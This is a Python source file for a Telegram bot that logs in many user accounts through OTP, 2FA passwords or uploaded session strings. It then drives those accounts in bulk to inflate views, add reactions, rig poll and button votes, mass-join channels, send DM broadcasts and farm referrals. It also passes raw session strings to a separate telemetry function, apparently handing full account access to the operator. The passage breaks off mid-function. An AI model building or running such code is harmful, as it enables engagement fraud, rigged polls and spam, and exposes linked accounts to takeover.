import asynci
import base64
import json
import os
import re
import time
from typing import Dict, Any, List, Optional, Tuple

# aiogram 3.x imports
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile
)

# Telethon imports
from telethon import TelegramClient, functions, types as tg_types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    FloodWaitError
)

# SQLite
import aiosqlite

# Import local configurations & refactored modules
import config
from config import logger
from database import db_mgr, encrypt_data, decrypt_data, parse_telegram_link, make_progress_bar
from admin import admin_router

registration_sessions: Dict[int, Dict[str, Any]] = {}
bot_username: str = "bot"

# --- CONCURRENT TASK MANAGER ENGINE ---
class TaskQueue:
    def __init__(self):
        self.queue = asyncio.Queue()
        self.current_tasks: Dict[int, asyncio.Task] = {}

    async def add_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        await self.queue.put((task_id, creator_id, task_type, payload, bot_instance, status_msg_id))

    def clear_pending_queue(self):
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                self.queue.task_done()
            except asyncio.QueueEmpty:
                break

    async def cancel_all_active_tasks(self) -> int:
        count = 0
        self.clear_pending_queue()
        active_ids = list(self.current_tasks.keys())
        for t_id in active_ids:
            loop_task = self.current_tasks.get(t_id)
            if loop_task and not loop_task.done():
                loop_task.cancel()
                count += 1
                async with aiosqlite.connect(db_mgr.db_path) as db:
                    await db.execute(
                        "UPDATE tasks SET status = 'cancelled', progress = 'Stopped by admin' WHERE task_id = ?", 
                        (t_id,)
                    )
                    await db.commit()
        return count

    async def start_worker(self):
        logger.info("Task runner loop started.")
        while True:
            try:
                task_id, creator_id, task_type, payload, bot_instance, status_msg_id = await self.queue.get()
            except asyncio.CancelledError:
                break
                
            loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload, bot_instance, status_msg_id))
            self.current_tasks[task_id] = loop_task
            try:
                await loop_task
            except asyncio.CancelledError:
                logger.warning(f"Task #{task_id} was stopped.")
            except Exception as e:
                logger.error(f"Error on task #{task_id}: {e}")
            finally:
                self.current_tasks.pop(task_id, None)
                self.queue.task_done()

    async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        start_time = time.time()
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("UPDATE tasks SET status = 'running', progress = '0%' WHERE task_id = ?", (task_id,))
            await db.commit()

        role = await db_mgr.get_user_role(creator_id)
        clients_data = []
        requested_count = int(payload.get("run_account_count", 0))
        account_routing = payload.get("account_routing", "own")
        
        async with aiosqlite.connect(db_mgr.db_path) as db:
            if role == "super_owner":
                if account_routing == "all":
                    query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
                    cursor = await db.execute(query)
                else:
                    query = "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
                    cursor = await db.execute(query, (creator_id,))
            elif role == "owner":
                query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
                cursor = await db.execute(query)
            else:
                query = "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
                cursor = await db.execute(query, (creator_id,))
            
            async for row in cursor:
                clients_data.append((row[0], decrypt_data(row[1])))

        if requested_count > 0:
            clients_data = clients_data[:requested_count]

        if not clients_data:
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("UPDATE tasks SET status = 'failed', progress = 'No accounts found' WHERE task_id = ?", (task_id,))
                await db.commit()
            try:
                await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text="❌ <b>Task Failed:</b> You do not have any operational accounts available under selected scopes.")
            except Exception:
                pass
            return

        passed_ids: List[str] = []
        failed_ids: List[Tuple[str, str]] = []
        total_accounts = len(clients_data)
        
        speed_mode = payload.get("speed_mode", "safe")
        if speed_mode == "safer":
            sleep_time = 2.5
        elif speed_mode == "fastest":
            sleep_time = 0.05
        else:
            sleep_time = 5.0

        semaphore = asyncio.Semaphore(5 if speed_mode == "safer" else (1 if speed_mode == "safe" else 25)) 
        progress_counter = 0
        success_counter = 0
        failure_counter = 0
        last_ui_update = 0

        async def worker_session(phone: str, enc_session: str, idx: int):
            nonlocal progress_counter, success_counter, failure_counter, last_ui_update
            async with semaphore:
                client = TelegramClient(StringSession(enc_session), config.API_ID, config.API_HASH)
                try:
                    await asyncio.sleep(sleep_time * idx)
                    await client.connect()
                    if not await client.is_user_authorized():
                        async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                            await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                            await db_conn.commit()
                        failed_ids.append((phone, "Session key expired"))
                        failure_counter += 1
                        return

                    target = payload.get("target", "")
                    channel_target = payload.get("channel_target", target)
                    do_leave_all = (task_type == "leave" and payload.get("leave_mode") == "all")

                    parsed_target, link_msg_id, is_target_private = parse_telegram_link(target) if not do_leave_all else (None, None, False)
                    parsed_channel, _, is_channel_private = parse_telegram_link(channel_target) if not do_leave_all else (None, None, False)
                    msg_id = int(payload.get("msg_id", link_msg_id or 0))

                    do_react = "react" in task_type
                    do_vote = "vote" in task_type
                    do_view = "view" in task_type or task_type == "speed"
                    do_join = (task_type == "join" or do_react or do_vote or do_view) and not do_leave_all
                    do_leave = task_type == "leave"
                    do_dm = task_type == "dm"
                    do_refer = task_type == "refer"

                    target_peer = None

                    # 1. Handle Join/Resolve Phase cleanly across private links
                    if do_join:
                        try:
                            if is_channel_private or "+ " in channel_target or "/+" in channel_target or "joinchat/" in channel_target:
                                invite_hash = parsed_channel if is_channel_private else parsed_target
                                updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
                                if hasattr(updates, 'chats') and updates.chats:
                                    target_peer = updates.chats[0]
                            else:
                                updates = await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))
                                if hasattr(updates, 'chats') and updates.chats:
                                    target_peer = updates.chats[0]
                        except Exception as join_err:
                            if "USER_ALREADY_PARTICIPANT" not in str(join_err):
                                failed_ids.append((phone, f"Failed to join: {str(join_err)}"))
                                failure_counter += 1
                                return

                    # 2. Fallback resolution if already joined or if target_peer is still None
                    if not target_peer and not do_leave_all:
                        try:
                            # Try resolving using the primary channel target identifier first
                            target_peer = await client.get_entity(parsed_channel or parsed_target)
                        except Exception:
                            try:
                                # Final structural check using the full baseline target identity parameters
                                target_peer = await client.get_entity(parsed_target)
                            except Exception as ent_err:
                                # For private networks, check if the client can see the message content directly
                                if msg_id:
                                    try:
                                        msg_obj = await client.get_messages(parsed_channel or parsed_target, ids=msg_id)
                                        if msg_obj:
                                            target_peer = msg_obj.peer_id
                                    except Exception:
                                        pass
                                if not target_peer:
                                    failed_ids.append((phone, f"Entity resolution failure: {str(ent_err)}"))
                                    failure_counter += 1
                                    return

                    # --- CORE ACTIONS CORRECTION GRID ---
                    if do_view and msg_id:
                        try:
                            await client(functions.messages.GetMessagesViewsRequest(peer=target_peer, id=[msg_id], increment=True))
                        except Exception as view_err:
                            failed_ids.append((phone, f"View error: {str(view_err)}"))
                            failure_counter += 1
                            return

                    if do_react and msg_id:
                        try:
                            emojis = payload.get("reactions", ["👍"])
                            assigned_emoji = emojis[idx % len(emojis)]
                            await client(functions.messages.SendReactionRequest(
                                peer=target_peer, msg_id=msg_id, reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                              ))
                        except Exception as react_err:
                            failed_ids.append((phone, f"Reaction error: {str(react_err)}"))
                            failure_counter += 1
                            return

                    if do_vote and msg_id:
                        try:
                            vote_mode = payload.get("vote_mode", "text")
                            if vote_mode == "inline":
                                button_text = payload.get("button_text", "").strip().lower()
                                msg = await client.get_messages(target_peer, ids=msg_id)
                                if msg and msg.reply_markup:
                                    target_button = None
                                    for row in msg.reply_markup.rows:
                                        for btn in row.buttons:
                                            if button_text in btn.text.strip().lower():
                                                target_button = btn
                                                break
                                        if target_button:
                                            break
                                    if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                                        await client(functions.messages.GetBotCallbackAnswerRequest(peer=target_peer, msg_id=msg_id, data=target_button.data))
                                    else:
                                        raise ValueError("Inline callback button match sequence not found.")
                                else:
                                    raise ValueError("Target message does not possess an inline keyboard markup.")
                            else:
                                chosen_option = int(payload.get("poll_option_index", 0))
                                await client(functions.messages.VotePollRequest(peer=target_peer, msg_id=msg_id, options=[bytes([chosen_option])]))
                        except Exception as vote_err:
                            failed_ids.append((phone, f"Vote error: {str(vote_err)}"))
                            failure_counter += 1
                            return

                    if do_dm:
                        try:
                            await client.send_message(target_peer, payload.get("text", "Hello!"))
                        except Exception as dm_err:
                            failed_ids.append((phone, f"DM error: {str(dm_err)}"))
                            failure_counter += 1
                            return

                    if do_refer:
                        try:
                            bot_username_target = str(target_peer).replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
                            start_param = None
                            if "start=" in target:
                                param_match = re.search(r'start=([^&\s]+)', target)
                                if param_match:
                                    start_param = param_match.group(1)
                            if "?" in bot_username_target:
                                bot_username_target = bot_username_target.split("?")[0]
                            await client.send_message(bot_username_target, f"/start {start_param}" if start_param else "/start")
                        except Exception as ref_err:
                            failed_ids.append((phone, f"Referral link error: {str(ref_err)}"))
                            failure_counter += 1
                            return

                    if do_leave:
                        if do_leave_all:
                            left_chats_count = 0
                            async for dialog in client.iter_dialogs():
                                if dialog.is_channel or dialog.is_group:
                                    try:
                                        await client(functions.channels.LeaveChannelRequest(channel=dialog.entity))
                                        left_chats_count += 1
                                        await asyncio.sleep(0.3)
                                    except FloodWaitError as fwe:
                                        await asyncio.sleep(fwe.seconds)
                                    except Exception:
                                        pass
                            if left_chats_count == 0:
                                failed_ids.append((phone, "Account was not in any channels"))
                                failure_counter += 1
                                return
                        else:
                            try:
                                # Resolves private entities inside structural links cleanly prior to firing leave event requests
                                leave_target = target_peer or await client.get_entity(parsed_channel or parsed_target)
                                input_channel = await client.get_input_entity(leave_target)
                                await client(functions.channels.LeaveChannelRequest(channel=input_channel))
                            except Exception as leave_err:
                                failed_ids.append((phone, f"Leave structural drop error: {str(leave_err)}"))
                                failure_counter += 1
                                return

                    passed_ids.append(phone)
                    success_counter += 1
                    
                except Exception as general_err:
                    failed_ids.append((phone, str(general_err)))
                    failure_counter += 1
                finally:
                    await client.disconnect()
                    progress_counter += 1
                    
                    current_now = time.time()
                    if current_now - last_ui_update >= 2.5 or progress_counter == total_accounts:
                        last_ui_update = current_now
                        pct_val = (progress_counter / total_accounts) * 100
                        elapsed = current_now - start_time
                        avg_time = elapsed / progress_counter if progress_counter > 0 else 0
                        remaining = (total_accounts - progress_counter) * avg_time
                        
                        eta_str = f"~{int(remaining // 60)}m {int(remaining % 60)}s" if remaining > 0 else "0s"
                        progress_pct = f"{int(pct_val)}%"
                        
                        live_text = (
                            f"⏳ <b>Campaign Processing Deployment Framework Running...</b>\n\n"
                            f"[{make_progress_bar(pct_val)}] <b>{progress_pct}</b>\n"
                            f"📊 <code>{progress_counter}/{total_accounts}</code> accounts completely run\n"
                            f"✅ Successful: <code>{success_counter}</code> | ❌ Blocked: <code>{failure_counter}</code>\n"
                            f"⏱ Time remaining duration: {eta_str}"
                        )
                        try:
                            await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text=live_text, parse_mode="HTML")
                        except Exception:
                            pass

                        async with aiosqlite.connect(db_mgr.db_path) as db_update:
                            await db_update.execute("UPDATE tasks SET progress = ? WHERE task_id = ?", (progress_pct, task_id))
                            await db_update.commit()

        await asyncio.gather(*(worker_session(phone, enc, i) for i, (phone, enc) in enumerate(clients_data)))

        end_time = time.time()
        elapsed_total = end_time - start_time
        duration_str = f"{int(elapsed_total // 60)}m {int(elapsed_total % 60)}s"

        status = "completed" if len(passed_ids) > 0 else "failed"
        success_report_json = json.dumps(passed_ids)
        failure_report_json = json.dumps(failed_ids)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute(
                "UPDATE tasks SET status = ?, progress = ?, success_report = ?, failure_report = ? WHERE task_id = ?",
                (status, f"{len(passed_ids)}/{total_accounts} Passed", success_report_json, failure_report_json, task_id)
            )
            await db.commit()

        success_pct_final = int((success_counter / total_accounts) * 100) if total_accounts > 0 else 0
        campaign_uuid = base64.b64encode(f"CAMP_{task_id}".encode()).decode().lower()[:24]
        
        user_info = f"<code>{creator_id}</code>"
        try:
            chat_member = await bot_instance.get_chat(creator_id)
            if chat_member.first_name:
                user_info = f"{chat_member.first_name} (<code>{creator_id}</code>)"
        except Exception:
            pass

        target_display = "ALL CHANNELS DEPLOYMENT" if payload.get("leave_mode") == "all" else f"<code>{payload.get('target', 'N/A')}</code>"

        failure_log_details = ""
        if failed_ids:
            failure_log_details = "\n\n❌ <b>Detailed Failure Telemetry Matrix:</b>\n"
            for phone_num, reason in failed_ids:
                failure_log_details += f"• <code>+{phone_num}</code> ➜ <i>{reason}</i>\n"

        completion_card = (
            f"👑 <b>Premium Task Management Closure Summary Card</b>\n\n"
            f"📋 Campaign ID: <code>{campaign_uuid}</code>\n"
            f"⚡ Action Code Execution: <code>{task_type.upper()}</code>\n"
            f"👤 Creator Node Profile: {user_info}\n"
            f"🔗 Target Location Path: {target_display}\n"
            f"📢 Secondary Target Scope: <code>{payload.get('channel_target', 'N/A')}</code>\n"
            f"🏎 Speed Interval Throttle: <code>{speed_mode.upper()}</code>\n\n"
            f"📊 <b>Performance Analytics Reports:</b>\n"
            f"✅ Success Threshold: <code>{success_counter}/{total_accounts}</code> ({success_pct_final}%)\n"
            f"❌ Core Failures Recorded: <code>{failure_counter}/{total_accounts}</code>\n"
            f"⏱ Production Runtime Elapsed: {duration_str}"
            f"{failure_log_details}"
        )

        try:
            await bot_instance.send_message(chat_id=creator_id, text=completion_card, parse_mode="HTML")
        except Exception:
            pass

        if config.LOG_CHANNEL_ID:
            try:
                await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=completion_card, parse_mode="HTML")
            except Exception as le:
                logger.error(f"Failed sending validation report to log channel: {le}")

task_queue = TaskQueue()

# --- FSM STATES ---
class RegistrationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()
    waiting_for_2fa = State()
    waiting_for_session_file = State()

class TaskWizardStates(StatesGroup):
    choosing_type = State()
    waiting_for_routing_choice = State()
    waiting_for_speed_choice = State()
    waiting_for_leave_choice = State()
    waiting_for_channel_link = State()
    waiting_for_post_link = State()
    waiting_for_vote_mode_choice = State()
    waiting_for_poll_option_index = State()
    waiting_for_emojis = State()
    waiting_for_button_text = State()
    waiting_for_dm_text = State()
    waiting_for_account_scale = State()

# --- UI KEYBOARD GENERATORS ---
REACTION_EMOJIS = [
    "🔥", "❤️", "💖", "💘", "💝",
    "👍", "👏", "🎉", "🤩", "💯",
    "⚡", "🍓", "💋", "🍿", "🏆",
    "🤣", "🥰", "🤔", "👀", "😎"
]

def get_post_registration_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✨ Connect Next Target Account", callback_data="add_account_phone")],
        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]
    ])

def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMarkup:
    keyboard = []
    row = []
    for emoji in REACTION_EMOJIS:
        is_selected = emoji in selected_emojis
        suffix = " ⭐" if is_selected else ""
        row.append(InlineKeyboardButton(text=f"{emoji}{suffix}", callback_data=f"toggle_emoji:{emoji}"))
        if len(row) == 5:  
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    keyboard.append([InlineKeyboardButton(text="🔱 Finalize Reaction Pack selection", callback_data="finish_emoji_selection")])
    keyboard.append([InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton(text="📱 Manage accounts", callback_data="manage_accounts:0")],
        [InlineKeyboardButton(text="🌋 Launch Active Campaign Tasks", callback_data="task_hub_start")],
        [InlineKeyboardButton(text="📊 Real-time Campaign Logs", callback_data="view_tasks")],
        [InlineKeyboardButton(text="⚜️ Referral link", callback_data="view_referrals")],
        [InlineKeyboardButton(text="👑 Developers", callback_data="system_credits")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛡️ Admin panel", callback_data="admin_panel")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="💾 Database Export/Import", callback_data="backup_panel")])
        buttons.append([InlineKeyboardButton(text="📈 user ids with details", callback_data="system_stats")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_task_types_keyboard(active_count: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔥 Reaction Only", callback_data="set_type:react"), InlineKeyboardButton(text="🗳️ Advanced Poll Voting", callback_data="set_type:vote")],
        [InlineKeyboardButton(text="⚡ Reaction + Vote", callback_data="set_type:react_vote"), InlineKeyboardButton(text="👁️ View Incrementor", callback_data="set_type:view")],
        [InlineKeyboardButton(text="💎 Reaction + View", callback_data="set_type:react_view"), InlineKeyboardButton(text="🎯 Vote + View", callback_data="set_type:vote_view")],
        [InlineKeyboardButton(text="🔮 Reaction + Vote + View ", callback_data="set_type:react_vote_view")],
        [InlineKeyboardButton(text="✅ Join Target Channel", callback_data="set_type:join"), InlineKeyboardButton(text="❌ Leave channel", callback_data="set_type:leave")],
        [InlineKeyboardButton(text="📥 Direct DM Broadcast", callback_data="set_type:dm")],
        [InlineKeyboardButton(text="🔗 Referral ", callback_data="set_type:refer"), InlineKeyboardButton(text="🏎️ Fast Speed Views", callback_data="set_type:speed")],
        [InlineKeyboardButton(text="🛑 Abort Setup Configuration", callback_data="main_menu")]
    ])

def get_leave_channel_options_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Leave channel link 1 only", callback_data="leave_mode:single")],
        [InlineKeyboardButton(text="💥 Complete Purge (Leave All Channels)", callback_data="leave_mode:all")],
        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]
    ])

# --- ROUTER REGISTER ---
router = Router()

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    referred_by = None
    if len(message.text.split()) > 1:
        ref_payload = message.text.split()[1]
        if ref_payload.startswith("ref_") and ref_payload[4:].isdigit():
            referred_by = int(ref_payload[4:])
            if referred_by == user_id:
                referred_by = None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)
    await db_mgr.log_action(user_id, "Started the bot", bot, operational=False)

    welcome_text = (
        f"👋 <b>Greetings, Elite User! Welcome back to Premium Session Hub Bot Terminal.</b>\n\n"
        f"Your system assigned clearance grade identifier: <b>{role.upper()}</b>\n"
        f"Select execution options or deploy automated cluster configurations below:"
    )
    await message.answer(welcome_text, reply_markup=get_main_keyboard(role), parse_mode="HTML")

@router.callback_query(F.data == "main_menu")
async def handle_main_menu(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    await state.clear()
    role = await db_mgr.get_user_role(callback.from_user.id)
    await callback.message.edit_text(
        f"👋 <b>Greetings, Elite User! Welcome back to Premium Session Hub Bot Terminal.</b>\n\n"
        f"Your system assigned clearance grade identifier: <b>{role.upper()}</b>\n"
        f"Select execution options or deploy automated cluster configurations below:",
        reply_markup=get_main_keyboard(role),
        parse_mode="HTML"
    )

@router.callback_query(F.data == "system_credits")
async def handle_system_credits(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    credits_text = (
        "🔱 <b>Lead Operations Developer Architect Info</b>\n\n"
        f"🎨 <b>UI/UX Aesthetic Architect:</b> @{config.DESIGNER_HANDLE}\n"
        f"⚙️ <b>Core Binary Operations Engineer:</b> @{config.MANAGER_HANDLE}\n\n"
        "<i>Thank you for utilising our premium cluster account management utility matrix core!</i>"
    )
    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]
    await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

# --- PAGINATED ACCOUNTS VIEW ---
@router.callback_query(F.data.startswith("manage_accounts:"))
async def list_user_accounts(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    limit = 10
    offset = page * limit
    
    try:
        await callback.answer() 
        role = await db_mgr.get_user_role(user_id)
        
        async with aiosqlite.connect(db_mgr.db_path) as db:
            if role in ["owner", "super_owner"]:
                count_query = "SELECT COUNT(*) FROM accounts"
                cursor_count = await db.execute(count_query)
                total_items = (await cursor_count.fetchone())[0]
                
                query = "SELECT phone, status, username FROM accounts LIMIT ? OFFSET ?"
                cursor = await db.execute(query, (limit, offset))
                rows = await cursor.fetchall()
            else:
                count_query = "SELECT COUNT(*) FROM accounts WHERE user_id = ?"
                cursor_count = await db.execute(count_query, (user_id,))
                total_items = (await cursor_count.fetchone())[0]
                
                query = "SELECT phone, status, username FROM accounts WHERE user_id = ? LIMIT ? OFFSET ?"
                cursor = await db.execute(query, (user_id, limit, offset))
                rows = await cursor.fetchall()

        text = f"📱 <b>System Session Telephony Matrix</b> (Page {page + 1})\n"
        text += f"Total registered datastore slots catalogued: <code>{total_items}</code>\n\n"
        
        if not rows:
            text += "<i>No profile records mapped inside this page window framework.</i>"
        else:
            for row in rows:
                icon = "🟢" if row[1] == "active" else "🔴"
                text += f"{icon} <code>+{row[0]}</code> (<b>@{row[2] or 'None'}</b>) ➜ [<b>{row[1].upper()}</b>]\n"

        buttons = []
        import_row = [
            InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone"),
            InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session")
        ]
        buttons.append(import_row)

        if role in ["super_owner", "owner"]:
            buttons.append([InlineKeyboardButton(text="📥 Open Session Export Dashboard", callback_data="export_dashboard_root")])
            
        buttons.append([InlineKeyboardButton(text="💥 Delete Dead Sessions", callback_data=f"purge_dead_accounts:{page}")])
        
        nav_row = []
        if page > 0:
            nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"manage_accounts:{page - 1}"))
        if offset + limit < total_items:
            nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"manage_accounts:{page + 1}"))
        
        if nav_row:
            buttons.append(nav_row)
            
        buttons.append([InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")])
        await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error handling list view page context: {e}")

@router.callback_query(F.data.startswith("purge_dead_accounts:"))
async def handle_purge_dead_accounts(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    role = await db_mgr.get_user_role(user_id)
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["owner", "super_owner"]:
            await db.execute("DELETE FROM accounts WHERE status = 'dead'")
        else:
            await db.execute("DELETE FROM accounts WHERE status = 'dead' AND user_id = ?", (user_id,))
        await db.commit()
    await callback.answer("✨ Purge process complete! Dead profile sessions dropped.", show_alert=True)
    
    callback.data = f"manage_accounts:{page}"
    await list_user_accounts(callback, bot)

# --- LINK NEW ACCOUNT VIA OTP ---
@router.callback_query(F.data == "add_account_phone")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        allowed_limit = await db_mgr.get_admin_limits(user_id)
        current_count = await db_mgr.get_current_account_count(user_id)
        if current_count >= allowed_limit:
            await callback.answer(f"❌ Limits Exceeded: Your profile cap is restricted to maximum {allowed_limit} account rows.", show_alert=True)
            return

    await callback.answer()
    await callback.message.edit_text("📱 <b>Type targeted terminal phone number string with country code mapping prefix (e.g. +919876543210):</b>", parse_mode="HTML")
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.message(StateFilter(RegistrationStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext, bot: Bot):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    user_id = message.from_user.id
    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        registration_sessions[user_id] = {"client": client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
        await message.answer("📩 <b>Enter the authentication OTP code received from official Telegram channel:</b>", parse_mode="HTML")
        await state.set_state(RegistrationStates.waiting_for_otp)
    except Exception as e:
        await message.answer(f"❌ <b>API Initialization Framework Refusal:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    otp = message.text.strip()
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Context session dropped framework boundaries. Re-run setup sequence initialization loops.")
        await state.clear()
        return

    client, phone, phone_code_hash = reg_data["client"], reg_data["phone"], reg_data["phone_code_hash"]
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        await complete_registration(message, state, client, phone, user_id, bot)
    except PhoneCodeInvalidError:
        await message.answer("❌ <b>The security signature token OTP code entered was mismatched/invalid. Retry again:</b>", parse_mode="HTML")
    except SessionPasswordNeededError:
        await message.answer("🔒 <b>Two-Factor security matrix verification prompt detected. Type your 2FA security password text:</b>", parse_mode="HTML")
        await state.set_state(RegistrationStates.waiting_for_2fa)
    except Exception as e:
        await message.answer(f"❌ <b>Authentication Chain Refusal:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    password = message.text.strip()
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await state.clear()
        return
    try:
        await reg_data["client"].sign_in(password=password)
        await complete_registration(message, state, reg_data["client"], reg_data["phone"], user_id, bot)
    except Exception as e:
        await message.answer(f"❌ <b>Cloud Password Evaluation Denied:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await reg_data["client"].disconnect()
        await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int, bot: Bot):
    try:
        me = await client.get_me()
        raw_session_str = client.session.save()
        encrypted_session = encrypt_data(raw_session_str)
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("""
                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
            """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
            await db.commit()
        
        await dispatch_session_telemetry(phone, raw_session_str, me.username, user_id, bot)

        await message.answer(
            f"🎉 <b>Onboarding Successful!</b> Account <code>+{phone}</code> is verified and logged inside system memory banks.", 
            reply_markup=get_post_registration_keyboard(),
            parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"❌ <b>Telemetry Storage Pipeline Failure:</b> <code>{str(e)}</code>", parse_mode="HTML")
    finally:
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

# --- ADVANCED UNIVERSAL IMPORT SYSTEM ---
@router.callback_query(F.data == "add_account_session")
async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        allowed_limit = await db_mgr.get_admin_limits(user_id)
        current_count = await db_mgr.get_current_account_count(user_id)
        if current_count >= allowed_limit:
            await callback.answer(f"❌ Limits Exceeded: Your profile cap is restricted to maximum {allowed_limit} account rows.", show_alert=True)
            return

    await callback.answer()
    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session file log:</b>\n<i>(Supports bulk multi-line files imports!)</i>", parse_mode="HTML")
    await state.set_state(RegistrationStates.waiting_for_session_file)

@router.message(StateFilter(RegistrationStates.waiting_for_session_file))
async def process_session_file(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    raw_content = ""
    
    if message.document:
        file_info = await bot.get_file(message.document.file_id)
        file_bytes = await bot.download_file(file_info.file_path)
        raw_content = file_bytes.read().decode('utf-8', errors='ignore').strip()
    elif message.text:
        raw_content = message.text.strip()

    if not raw_content:
        await message.answer("❌ <b>Source Error:</b> Empty input detected. Verification canceled.")
        await state.clear()
        return

    potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
    
    if not potential_sessions:
        await message.answer("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your text.")
        await state.clear()
        return

    status_msg = await message.answer(f"⚡ <b>Analyzing and validating <code>{len(potential_sessions)}</code> potential session profiles chunks...</b>", parse_mode="HTML")
    
    success_imports = 0
    failed_imports = 0
    quota_reached = False

    for session_str in potential_sessions:
        if role not in ["super_owner", "owner"]:
            allowed_limit = await db_mgr.get_admin_limits(user_id)
            current_count = await db_mgr.get_current_account_count(user_id)
            if current_count >= allowed_limit:
                quota_reached = True
                break

        try:
